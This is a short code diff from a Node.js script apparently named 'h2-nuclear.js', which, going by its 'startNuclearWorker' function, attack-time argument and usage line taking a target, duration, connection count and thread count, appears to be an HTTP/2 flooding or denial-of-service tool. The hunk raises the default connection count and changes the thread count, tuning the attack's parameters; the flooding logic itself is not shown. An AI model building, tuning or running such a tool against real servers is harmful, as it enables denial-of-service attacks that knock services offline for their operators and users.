@@ -316,8 +316,8 @@ function startNuclearWorker(target, connectionCount, attackTime) {
 const args = process.argv.slice(2);
 const TARGET = args[0];
 const TIME = parseInt(args[1]) || 60;
-const CONNECTIONS = parseInt(args[2]) || 200;
-const THREADS = parseInt(args[3]) || 4;
+const CONNECTIONS = parseInt(args[2]) || 400;
+const THREADS = parseInt(args[3]) || 2;
 
 if (!TARGET) {
     console.log('Usage: node h2-nuclear.js <target> <time> <connections> <threads>');
